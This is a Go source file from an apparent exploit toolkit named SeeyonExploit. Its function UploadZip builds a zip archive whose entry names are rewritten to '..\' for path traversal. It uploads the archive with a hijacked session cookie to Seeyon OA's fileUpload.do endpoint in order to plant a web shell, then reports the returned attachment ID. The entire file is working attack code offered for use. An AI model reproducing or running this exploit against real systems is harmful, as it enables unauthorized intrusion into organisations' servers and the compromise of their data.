package SessionGetshell

import (
	"SeeyonExploit/utils"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"os"
	"regexp"
	"strings"
)

func UploadZip(url string, session string, filename string, serverfilename string) string {
	url = url + "/seeyon/fileUpload.do?method=processUpload"

	f1, _ := os.Create("layout.xml")
	defer f1.Close()
	f2, _ := os.Create("fff" + serverfilename)
	defer f2.Close()

	source, err := os.Open(filename)
	utils.PanicErr(err)
	defer source.Close()

	io.Copy(f2, source)
	//utils.GenerateZip("temp", "temp.zip")
	files := []string{"layout.xml", "fff" + serverfilename}
	utils.ZipFiles("temp.zip", files)
	os.Remove("fff" + serverfilename)

	header := make(map[string]string)
	header["Cookie"] = session
	header["Upgrade-Insecure-Requests"] = "1"
	header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
	header["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
	header["Accept-Encoding"] = ""
	header["Accept-Language"] = "zh-CN,zh;q=0.9"

	//上传文件和表单字段
	var buff bytes.Buffer
	writer := multipart.NewWriter(&buff)
	_ = writer.WriteField("firstSave", "true")
	_ = writer.WriteField("callMethod", "resizeLayout")
	_ = writer.WriteField("isEncrypt", "0")
	_ = writer.WriteField("takeOver", "false")
	_ = writer.WriteField("type", "0")

	w, _ := writer.CreateFormFile("file1", "temp.zip")
	fil, err := os.Open("temp.zip")
	if err != nil {
		panic(err)
	}
	defer fil.Close()
	content, err := ioutil.ReadAll(fil)
	str_content := string(content)
	a := strings.Replace(str_content, "fff", `..\`, -1)
	b := []byte(a)
	_, _ = w.Write(b)
	writer.Close()
	header["Content-Type"] = writer.FormDataContentType()

	resp := utils.PostData2(url, &buff, header)
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
	}
	defer resp.Body.Close()
	body_str := string(body)
	regexp, _ := regexp.Compile(`-?\d{19}`)
	//返回附件ID
	id := regexp.FindString(body_str)
	if id != "" {
		fmt.Println("上传zip文件成功，附件id为：" + id)
		return id
	} else {
		fmt.Println("[-]上传zip文件失败")
		fmt.Println("[-]不存在漏洞：SessionGetshell")
		fmt.Println("=========================================================================")
	}
	return ""

}
